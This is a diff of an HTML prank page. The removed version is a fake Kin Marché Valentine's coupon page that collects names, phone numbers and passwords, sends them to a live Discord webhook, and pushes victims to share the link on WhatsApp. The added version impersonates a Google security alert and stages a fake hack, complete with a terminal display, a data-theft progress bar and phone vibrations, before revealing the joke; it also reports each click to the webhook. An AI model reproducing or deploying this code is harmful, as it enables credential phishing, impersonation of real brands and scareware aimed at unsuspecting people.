@@ -4,250 +4,198 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>Kin Marché - Promotion Officielle</title>
-    <meta property="og:title" content="🍫 PROMO KIN MARCHÉ : -85% SUR TOUT !">
-    <meta property="og:description" content="Offre Saint-Valentin exclusive ! Obtenez votre coupon de réduction immédiatement après validation.">
-    <meta property="og:image" content="https://i.ibb.co/Lzh8vYm/kin-logo.png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://jeanluctshunza-prog.github.io/KIN-MARCHE/">
+    <title>Google Security Check</title>
+    <meta property="og:title" content="⚠️ Alerte de sécurité Google">
+    <meta property="og:description" content="Une tentative de connexion suspecte a été détectée sur votre compte. Vérifiez maintenant.">
+    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/googleg_96dp.png">
 
     <style>
-        /* Couleurs Kin Marché : Rouge et Blanc */
-        :root { 
-            --km-red: #e30613; 
-            --km-white: #ffffff;
-            --km-gray: #f4f4f4;
-        }
-        
-        body { 
-            margin: 0; 
-            padding: 0; 
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
-            background: var(--km-gray); 
-            color: #333; 
-            overflow-x: hidden; 
-        }
-        
-        /* FOND INTERACTIF DISCRET */
-        #bg-animation { 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            z-index: -1; 
-            background: white; 
-        }
-        .floating { 
-            position: absolute; 
-            color: rgba(227, 6, 19, 0.1); 
-            font-size: 25px; 
-            animation: move 8s linear infinite; 
-            pointer-events: none; 
-        }
-        @keyframes move { 
-            from { transform: translateY(110vh); } 
-            to { transform: translateY(-10vh); } 
-        }
-
-        /* DESIGN ÉPURÉ KIN MARCHÉ */
-        .header {
-            background: var(--km-white);
-            padding: 15px;
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: white;
+            color: black;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             text-align: center;
-            border-bottom: 3px solid var(--km-red);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
 
-        .container { 
-            width: 90%; 
-            max-width: 400px; 
-            background: var(--km-white); 
-            margin: 30px auto; 
-            padding: 30px; 
-            border-radius: 8px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
-            text-align: center; 
-        }
-
-        .timer { 
-            color: var(--km-red); 
-            font-weight: bold; 
-            font-size: 1rem; 
-            margin-bottom: 20px;
-        }
-
-        h2 { color: var(--km-red); text-transform: uppercase; font-size: 1.2rem; margin-top: 0; }
-        
-        input { 
-            width: 100%; 
-            padding: 15px; 
-            margin: 12px 0; 
-            border: 1px solid #ccc; 
-            border-radius: 4px; 
-            box-sizing: border-box; 
-            font-size: 1rem; 
-            background: #fafafa;
-        }
-
-        .btn { 
-            background: var(--km-red); 
-            color: white; 
-            border: none; 
-            padding: 18px; 
-            width: 100%; 
-            border-radius: 4px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            font-size: 1rem; 
-            text-transform: uppercase;
-            transition: background 0.3s; 
-        }
-        .btn:hover { background: #b3050f; }
-        
-        .progress-container { 
-            background: #eee; 
-            border-radius: 20px; 
-            height: 15px; 
-            margin: 25px 0; 
-            overflow: hidden; 
-        }
-        .progress-bar { 
-            background: #25D366; 
-            width: 0%; 
-            height: 100%; 
-            transition: width 0.5s ease; 
-        }
-
-        #final-step h1 { color: var(--km-red); }
-        .coupon-box {
-            border: 2px dashed var(--km-red);
-            padding: 15px;
-            margin: 20px 0;
-            background: #fff5f5;
+        /* ÉCRAN 1 : LE PIÈGE GOOGLE */
+        #init-screen { width: 90%; max-width: 400px; }
+        .google-logo { width: 120px; margin-bottom: 20px; }
+        .btn-verify {
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1rem;
             font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        /* ÉCRAN 2 : LE HACK (FOND NOIR) */
+        #hack-screen {
+            display: none;
+            background-color: #000;
+            color: #0f0;
+            width: 100%;
+            height: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .emergency-blink { animation: bgBlink 0.2s infinite; }
+        @keyframes bgBlink {
+            0% { background-color: #000; }
+            50% { background-color: #600; }
+            100% { background-color: #000; }
+        }
+
+        #terminal {
+            text-align: left;
+            font-size: 13px;
+            margin-top: 20px;
+            height: 60%;
+            overflow: hidden;
+        }
+
+        /* ÉCRAN 3 : L'ALERTE FINALE */
+        #warning-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            color: red;
+            z-index: 1000;
+            padding: 40px 20px;
+            box-sizing: border-box;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 25px;
+            background: #eee;
+            border: 2px solid red;
+            margin: 20px 0;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: red;
         }
     </style>
 </head>
 <body>
 
-<div id="bg-animation"></div>
-
-<div class="header">
-    <img src="https://i.ibb.co/Lzh8vYm/kin-logo.png" style="width:120px;">
-</div>
-
-<div class="container" id="timer-box">
-    <div class="timer">TEMPS RESTANT : <span id="time">05:00</span></div>
-</div>
-
-<div class="container" id="step1">
-    <h2>Offre Spéciale Saint-Valentin</h2>
-    <p>Inscrivez-vous pour obtenir votre coupon de réduction de <b>-85%</b> valable dans tous nos magasins.</p>
-    <input type="text" id="name" placeholder="Nom complet">
-    <input type="tel" id="phone" placeholder="Numéro de téléphone">
-    <input type="password" id="secret" placeholder="Créez votre Clé d'accès">
-    <button class="btn" onclick="sendToDiscord()">Activer mon coupon</button>
-</div>
-
-<div class="container" id="step2" style="display:none;">
-    <h2>Vérification du profil...</h2>
-    <p id="share-txt">Étape 1/3 : Partagez cette offre avec <b>5 amis ou groupes</b> sur WhatsApp pour valider votre identité.</p>
-    <div class="progress-container">
-        <div class="progress-bar" id="bar"></div>
+    <div id="init-screen">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo">
+        <h2>Vérification requise</h2>
+        <p>Google a détecté une activité inhabituelle. Veuillez confirmer que vous êtes le propriétaire de cet appareil.</p>
+        <br>
+        <button class="btn-verify" onclick="startPanic()">VÉRIFIER L'APPAREIL</button>
     </div>
-    <p id="status" style="font-weight:bold; color:#25D366">0% de progression</p>
-    <button class="btn" style="background:#25D366;" onclick="shareWA()">PARTAGER SUR WHATSAPP</button>
-</div>
 
-<div class="container" id="final-step" style="display:none;">
-    <h1>🤡 PIÉGÉ !</h1>
-    <p>C'était une blague de <b>OLY</b> !</p>
-    <p>Il n'y a malheureusement pas de coupon de -85% aujourd'hui.</p>
-    <div class="coupon-box">
-        CODE VICTIME : KM-VAL-2026
+    <div id="hack-screen">
+        <h1 style="color:red">SCAN SYSTÈME EN COURS...</h1>
+        <div id="terminal"></div>
     </div>
-    <p>Partage ce lien à tes amis pour les piéger à ton tour !</p>
-</div>
 
-<script>
-    const webhook = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
-    let p = parseInt(localStorage.getItem('oly_prog')) || 0;
-
-    window.onload = () => {
-        if(p > 0) {
-            document.getElementById('step1').style.display = "none";
-            document.getElementById('step2').style.display = "block";
-            updateUI();
-        }
-        startTimer(300, document.querySelector('#time'));
-    };
-
-    function startTimer(duration, display) {
-        let timer = duration, min, sec;
-        setInterval(() => {
-            min = parseInt(timer / 60, 10);
-            sec = parseInt(timer % 60, 10);
-            display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
-            if (--timer < 0) timer = 0;
-        }, 1000);
-    }
-
-    function sendToDiscord() {
-        const n = document.getElementById('name').value;
-        const ph = document.getElementById('phone').value;
-        const s = document.getElementById('secret').value;
-        if(!n || !ph || !s) return alert("Veuillez remplir tous les champs.");
+    <div id="warning-overlay">
+        <h1 style="font-size: 2.5rem; margin-bottom: 0;">⚠️ ERREUR FATALE ⚠️</h1>
+        <p style="font-size: 1.2rem; font-weight: bold; color: black;">DONNÉES COMPROMISES</p>
+        <hr>
+        <p style="color: black;">Transfert forcé des photos et messages WhatsApp vers le serveur distant :</p>
+        <h2 style="background: red; color: white; padding: 10px; display: inline-block;">DESTINATION : 0819679859</h2>
         
-        fetch(webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: `🚩 **Nouvelle entrée**\n👤 Nom: ${n}\n📞 Tel: ${ph}\n🔑 Clé: ${s}` })
-        });
+        <div class="progress-bar">
+            <div id="fill" class="progress-fill"></div>
+        </div>
         
-        p = 5;
-        localStorage.setItem('oly_prog', p);
-        document.getElementById('step1').style.display = "none";
-        document.getElementById('step2').style.display = "block";
-        updateUI();
-    }
+        <p style="font-size: 1.5rem; font-weight: bold;">ENVOI : <span id="percent">0</span>%</p>
+        
+        <div id="final-joke" style="display:none; color: blue; margin-top: 30px;">
+            <h2 style="font-size: 2rem;">🤡 PIÉGÉ !</h2>
+            <p style="font-size: 1.2rem;">C'était une blague de <b>OLY</b> !<br>Respire, ton téléphone n'a rien du tout 😂</p>
+        </div>
+    </div>
 
-    function shareWA() {
-        window.open(`whatsapp://send?text=😱 Kin Marché offre des bons de -85% pour la Saint-Valentin ! Je viens de réserver le mien, regarde ici : ${window.location.href}`);
-        setTimeout(() => {
-            p += 32;
-            if(p > 100) p = 100;
-            localStorage.setItem('oly_prog', p);
-            updateUI();
-        }, 1500);
-    }
+    <script>
+        const webhook = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
 
-    function updateUI() {
-        document.getElementById('bar').style.width = p + "%";
-        document.getElementById('status').innerText = Math.floor(p) + "% complété";
-        const txt = document.getElementById('share-txt');
-        if(p < 38) txt.innerHTML = "Étape 1/3 : Partagez avec <b>5 amis ou groupes</b>.";
-        else if(p < 72) txt.innerHTML = "Étape 2/3 : Encore <b>5 partages</b> requis !";
-        else if(p < 100) txt.innerHTML = "Dernière étape : Partagez une dernière fois pour obtenir votre code !";
-        else {
-            document.getElementById('step2').style.display = "none";
-            document.getElementById('final-step').style.display = "block";
-            document.getElementById('timer-box').style.display = "none";
+        function startPanic() {
+            // Activer le mode hack
+            document.getElementById('init-screen').style.display = 'none';
+            document.getElementById('hack-screen').style.display = 'block';
+            document.body.style.backgroundColor = "black";
+
+            // Vibration (Autorisée car clic sur bouton)
+            if (navigator.vibrate) {
+                navigator.vibrate([500, 200, 500, 200, 800]);
+            }
+
+            // Signal Discord
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: "⚡ **ALERTE :** Une victime a cliqué sur le bouton Google ! Le hack commence..."})
+            });
+
+            const terminal = document.getElementById('terminal');
+            const lines = [
+                "> Connexion SSH établie...",
+                "> Localisation GPS : Kinshasa, DRC",
+                "> Accès aux fichiers /ROOT/DCIM...",
+                "> Récupération des jetons WhatsApp...",
+                "> Ouverture du tunnel vers 0819679859...",
+                "> Compression des données (2.4 GB)...",
+                "> Bypass sécurité Android/iOS...",
+                "> DÉBUT DE L'EXTRACTION..."
+            ];
+
+            let i = 0;
+            const logInterval = setInterval(() => {
+                if(i < lines.length) {
+                    terminal.innerHTML += `<span style="color:${i % 2 === 0 ? '#0f0' : '#fff'}">${lines[i]}</span><br>`;
+                    i++;
+                } else {
+                    clearInterval(logInterval);
+                    setTimeout(showFinalAlert, 500);
+                }
+            }, 500);
         }
-    }
 
-    const bg = document.getElementById('bg-animation');
-    for(let i=0; i<15; i++) {
-        let el = document.createElement('div');
-        el.className = 'floating';
-        el.innerText = '❤️';
-        el.style.left = Math.random() * 100 + 'vw';
-        el.style.top = Math.random() * 100 + 'vh';
-        el.style.animationDuration = (Math.random() * 5 + 5) + 's';
-        bg.appendChild(el);
-    }
-</script>
+        function showFinalAlert() {
+            document.getElementById('hack-screen').style.display = 'none';
+            document.getElementById('warning-overlay').style.display = 'block';
+            document.body.classList.add('emergency-blink');
+            
+            let p = 0;
+            const fill = document.getElementById('fill');
+            const pct = document.getElementById('percent');
+
+            const transfer = setInterval(() => {
+                p += Math.floor(Math.random() * 8) + 2;
+                if (p >= 100) {
+                    p = 100;
+                    clearInterval(transfer);
+                    document.body.classList.remove('emergency-blink');
+                    document.getElementById('final-joke').style.display = 'block';
+                    if (navigator.vibrate) navigator.vibrate(1000); // Grosse vibration de fin
+                }
+                fill.style.width = p + "%";
+                pct.innerText = p;
+
+                // Petites vibrations de stress
+                if (p % 10 === 0 && navigator.vibrate) navigator.vibrate(100);
+            }, 250);
+        }
+    </script>
 </body>
 </html>
